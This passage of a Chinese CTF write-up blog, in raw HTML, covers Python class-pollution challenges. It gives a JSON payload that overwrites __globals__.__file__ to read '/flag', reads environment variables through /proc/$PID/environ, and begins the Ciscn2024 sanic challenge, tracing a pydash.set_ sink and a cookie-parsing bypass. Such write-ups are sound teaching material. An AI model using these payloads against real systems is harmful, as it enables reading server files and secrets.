class=\"string\">&quot;/flag&quot;</span>#当flag在根目录下以及flag文件名知道的情况下</span><br><span class=\"line\">            <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/283dc0e8e2fa4c809e8dd7356a9cfe04.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t但是，上传却失败了？（这儿可能会出现两个问题，除了黑名单本身的问题外，还有个重点问题，也会导致失败，就是一定要把 Content-Type 修改为<strong> application/json</strong>）看看这儿：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> black_list</span><br></pre></td></tr></table></figure>\n<p>​\t\t虽然挺明显的，但还是很阴。很显然，在 check 函数下，有个与黑名单的比较，推测应该是这儿过不了，不过，当我们依次把那几个变量修改一下之后，发现，当 <code>__init__</code> 被修改成 <code>__int__</code> 后，返回的是 Register Success，所以，这里似乎只需要绕过 <code>__init__</code> 就行了，先做如下测试：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">A</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">a = A()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a.__class__.check.__globals__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x00000122A3EB56D0&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;D:\\\\html study\\\\PyCharm Project\\\\flask_pydash1\\\\test.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;A&#x27;: &lt;class &#x27;__main__.A&#x27;&gt;, &#x27;a&#x27;: &lt;__main__.A object at 0x00000122A405FA50&gt;&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t发现我们可以通过对象的方法来获取 <code>__globals__</code> 全局变量，所以 payload 可以如下构造：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;username&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;a&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;password&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;b&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;__class__&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;check&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;__globals__&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">                <span class=\"attr\">&quot;__file__&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;/flag&quot;</span></span><br><span class=\"line\">            <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t但是最后读取根路由的时候出现了哥问题，那就是，flag 文件名不对。</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/f39a01d5d0ed4bbaac39251c83970cdc.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t令人窒息的操作。不过有一点儿或许有点儿希望，那就是环境变量，如果环境变量里面也没有的话，那我可就真没法了，说干就干，首先，环境变量可以通过  <code>/proc/$PID/environ</code>  来读取，这里推测有可能需要用到爆破。</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/5d2180dbf885469a822d061ec3e4c913.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t之后读取根路由：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/dfd34f6d7e2f4a6bbdbbe3c0491905c5.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t运气好，flag 刚好就在环境变量里。flag 如下：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;1084bd02-8273-4a0b-a490-08451805df3a&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn2024-初赛-sanic\"><a class=\"markdownIt-Anchor\" href=\"#ciscn2024-初赛-sanic\">#</a> [Ciscn2024 初赛] sanic</h2>\n<p>​\t\t根路由提示： where is my flag?，f12 后发现提示了 /src 路由，访问后获得源码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sanic <span class=\"keyword\">import</span> Sanic</span><br><span class=\"line\"><span class=\"keyword\">from</span> sanic.response <span class=\"keyword\">import</span> text, html</span><br><span class=\"line\"><span class=\"keyword\">from</span> sanic_session <span class=\"keyword\">import</span> Session</span><br><span class=\"line\"><span class=\"keyword\">import</span> pydash</span><br><span class=\"line\"><span class=\"comment\"># pydash==5.1.2</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Pollute</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">app = Sanic(__name__)</span><br><span class=\"line\">app.static(<span class=\"string\">&quot;/static/&quot;</span>, <span class=\"string\">&quot;./static/&quot;</span>)</span><br><span class=\"line\">Session(app)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">index</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> html(<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;static/index.html&#x27;</span>).read())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/login&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">login</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    user = request.cookies.get(<span class=\"string\">&quot;user&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> user.lower() == <span class=\"string\">&#x27;adm;n&#x27;</span>:</span><br><span class=\"line\">        request.ctx.session[<span class=\"string\">&#x27;admin&#x27;</span>] = <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;login success&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;login fail&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/src&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">src</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> text(<span class=\"built_in\">open</span>(__file__).read())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/admin&quot;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">admin</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.ctx.session.get(<span class=\"string\">&#x27;admin&#x27;</span>) == <span class=\"literal\">True</span>:</span><br><span class=\"line\">        key = request.json[<span class=\"string\">&#x27;key&#x27;</span>]</span><br><span class=\"line\">        value = request.json[<span class=\"string\">&#x27;value&#x27;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> key <span class=\"keyword\">and</span> value <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(key) <span class=\"keyword\">is</span> <span class=\"built_in\">str</span> <span class=\"keyword\">and</span> <span class=\"string\">&#x27;_.&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> key:</span><br><span class=\"line\">            pollute = Pollute()</span><br><span class=\"line\">            pydash.set_(pollute, key, value)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;forbidden&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;forbidden&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t初步审一下逻辑，有用的信息如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/src&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">src</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> text(<span class=\"built_in\">open</span>(__file__).read())</span><br></pre></td></tr></table></figure>\n<p>​\t\t一眼看上去没什么，但是和下面这个结合起来就不一样了：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/admin&quot;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">admin</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.ctx.session.get(<span class=\"string\">&#x27;admin&#x27;</span>) == <span class=\"literal\">True</span>:</span><br><span class=\"line\">        key = request.json[<span class=\"string\">&#x27;key&#x27;</span>]</span><br><span class=\"line\">        value = request.json[<span class=\"string\">&#x27;value&#x27;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> key <span class=\"keyword\">and</span> value <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(key) <span class=\"keyword\">is</span> <span class=\"built_in\">str</span> <span class=\"keyword\">and</span> <span class=\"string\">&#x27;_.&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> key:</span><br><span class=\"line\">            pollute = Pollute()</span><br><span class=\"line\">            pydash.set_(pollute, key, value)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;forbidden&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;forbidden&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t在 admin 这个路由中，可以清晰地看到 pydash.set_() 函数，结合上一个信息，应该是打 python 的原型链污染 <code>__file__</code> 来读文件，那么，还有个路由需要注意：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/login&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">login</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    user = request.cookies.get(<span class=\"string\">&quot;user&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> user.lower() == <span class=\"string\">&#x27;adm;n&#x27;</span>:</span><br><span class=\"line\">        request.ctx.session[<span class=\"string\">&#x27;admin&#x27;</span>] = <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;login success&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;login fail&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里可以发现的是，我们需要传入一个 Cookie 的值为 user=adm;n 才行，但是，试过了，不行，为啥呢？</p>\n<p><strong>注意：以下为我个人分析方式，由于我本人异常菜鸡，所以很有可能是错误的，不可盲目相信。</strong></p>\n<p>​\t\t然后我们盯住 <code>user = request.cookies.get(&quot;user&quot;)</code>  这一行代码，对着 cookie 同时按住 ctrl + 左键，找到这一行内容，跟进：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/334caff31c114d5da4c4fd89b1523085.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t发现如下源码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@property</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cookies</span>(<span class=\"params\">self</span>) -&gt; RequestParameters:</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Incoming cookies on the request</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Returns:</span></span><br><span class=\"line\"><span class=\"string\">        RequestParameters: Incoming cookies on the request</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> self.parsed_cookies <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        self.get_cookies()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> cast(CookieRequestParameters, self.parsed_cookies)</span><br></pre></td></tr></table></figure>\n<p>​\t\t跟进  <code>get_cookies()</code> ：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_cookies</span>(<span class=\"params\">self</span>) -&gt; RequestParameters:</span><br><span class=\"line\">    cookie = self.headers.getone(<span class=\"string\">&quot;cookie&quot;</span>, <span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    self.parsed_cookies = CookieRequestParameters(parse_cookie(cookie))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> self.parsed_cookies</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里审过前面那个对象，重要程度没有再跟进 <code>parse_cookie(cookie)</code>  高，所以跟进 <code>parse_cookie(cookie)</code> ：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">parse_cookie</span>(<span class=\"params\">raw: <span class=\"built_in\">str</span></span>) -&gt; <span class=\"type\">Dict</span>[<span class=\"built_in\">str</span>, <span class=\"type\">List</span>[<span class=\"built_in\">str</span>]]:</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Parses a raw cookie string into a dictionary.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    The function takes a raw cookie string (usually from HTTP headers) and</span></span><br><span class=\"line\"><span class=\"string\">    returns a dictionary where each key is a cookie name and the value is a</span></span><br><span class=\"line\"><span class=\"string\">    list of values for that cookie. The function handles quoted values and</span></span><br><span class=\"line\"><span class=\"string\">    skips invalid cookie names.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">        raw (str): The raw cookie string to be parsed.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Returns:</span></span><br><span class=\"line\"><span class=\"string\">        Dict[str, List[str]]: A dictionary containing the cookie names as keys</span></span><br><span class=\"line\"><span class=\"string\">        and a list of values for each cookie.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Example:</span></span><br><span class=\"line\"><span class=\"string\">        ```python</span></span><br><span class=\"line\"><span class=\"string\">        raw = &#x27;name1=value1; name2=&quot;value2&quot;; name3=value3&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        cookies = parse_cookie(raw)</span></span><br><span class=\"line\"><span class=\"string\">        # cookies will be &#123;&#x27;name1&#x27;: [&#x27;value1&#x27;], &#x27;name2&#x27;: [&#x27;value2&#x27;], &#x27;name3&#x27;: [&#x27;value3&#x27;]&#125;</span></span><br></pre></td></tr></table></figure>\n<pre><code>&quot;&quot;&quot;  # noqa: E501\ncookies: Dict[str, List[str]] = &#123;&#125;\n\nfor token in raw.split(&quot;;&quot;):\n    name, sep, value = token.partition(&quot;=&quot;)\n    name = name.strip()\n    value = value.strip()\n\n    # Support cookies =value or plain value with no name\n    # https://github.com/httpwg/http-extensions/issues/159\n    if not sep:\n        if not name:\n            # Empty value like ;; or a cookie header with no value\n            continue\n        name, value = &quot;&quot;, name\n\n    if COOKIE_NAME_RESERVED_CHARS.search(name):  # no cov\n        continue\n\n    if len(value) &gt; 2 and value[0] == '&quot;' and value[-1] == '&quot;':  # no cov\n        value = _unquote(value)\n\n    if name in cookies:\n        cookies[name].append(value)\n    else:\n        cookies[name] = [value]\n\nreturn cookies\n</code></pre>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">​\t\t这里有一点需要注意：</span><br><span class=\"line\"></span><br><span class=\"line\">```python</span><br><span class=\"line\"> for token in raw.split(&quot;;&quot;):</span><br><span class=\"line\">        name, sep, value = token.partition(&quot;=&quot;)</span><br><span class=\"line\">        name = name.strip()</span><br><span class=\"line\">        value = value.strip()</span><br></pre></td></tr></table></figure>\n<p>​\t\t这个代码很显然是将分号前后分割成了两个字符串，也就是说，我们想要输入的 Cookie: user=adm;n 会变成 user=adm 以及 n 这两个串。</p>\n<p>​\t\t根据这几行，大概可以发现最后返回的内容和什么有关了：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(value) &gt; <span class=\"number\">2</span> <span class=\"keyword\">and</span> value[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;&quot;&#x27;</span> <span class=\"keyword\">and</span> value[-<span class=\"number\">1</span>] == <span class=\"string\">&#x27;&quot;&#x27;</span>:  <span class=\"comment\"># no cov</span></span><br><span class=\"line\">        value = _unquote(value)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> name <span class=\"keyword\">in</span> cookies:</span><br><span class=\"line\">        cookies[name].append(value)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        cookies[name] = [value]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> cookies</span><br></pre></td></tr></table></figure>\n<p>​\t\t很明显，最终返回的是 cookies ，但是每次操作 cookies 都是增加的 value 参数，由此，根据  <code>value = _unquote(value)</code> ，这里跟进 <code>_unquote(value)</code> ：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">_unquote</span>(<span class=\"params\"><span class=\"built_in\">str</span></span>):  <span class=\"comment\"># no cov</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">str</span> <span class=\"keyword\">is</span> <span class=\"literal\">None</span> <span class=\"keyword\">or</span> <span class=\"built_in\">len</span>(<span class=\"built_in\">str</span>) &lt; <span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">str</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">str</span>[<span class=\"number\">0</span>] != <span class=\"string\">&#x27;&quot;&#x27;</span> <span class=\"keyword\">or</span> <span class=\"built_in\">str</span>[-<span class=\"number\">1</span>] != <span class=\"string\">&#x27;&quot;&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">str</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">str</span> = <span class=\"built_in\">str</span>[<span class=\"number\">1</span>:-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    i = <span class=\"number\">0</span></span><br><span class=\"line\">    n = <span class=\"built_in\">len</span>(<span class=\"built_in\">str</span>)</span><br><span class=\"line\">    res = []</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">0</span> &lt;= i &lt; n:</span><br><span class=\"line\">        o_match = OCTAL_PATTERN.search(<span class=\"built_in\">str</span>, i)</span><br><span class=\"line\">        q_match = QUOTE_PATTERN.search(<span class=\"built_in\">str</span>, i)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> o_match <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> q_match:</span><br><span class=\"line\">            res.append(<span class=\"built_in\">str</span>[i:])</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"comment\"># else:</span></span><br><span class=\"line\">        j = k = -<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> o_match:</span><br><span class=\"line\">            j = o_match.start(<span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> q_match:</span><br><span class=\"line\">            k = q_match.start(<span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> q_match <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> o_match <span class=\"keyword\">or</span> k &lt; j):</span><br><span class=\"line\">            res.append(<span class=\"built_in\">str</span>[i:k])</span><br><span class=\"line\">            res.append(<span class=\"built_in\">str</span>[k + <span class=\"number\">1</span>])</span><br><span class=\"line\">            i = k + <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            res.append(<span class=\"built_in\">str</span>[i:j])</span><br><span class=\"line\">            res.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(<span class=\"built_in\">str</span>[j + <span class=\"number\">1</span> : j + <span class=\"number\">4</span>], <span class=\"number\">8</span>)))  <span class=\"comment\"># noqa: E203</span></span><br><span class=\"line\">            i = j + <span class=\"number\">4</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span 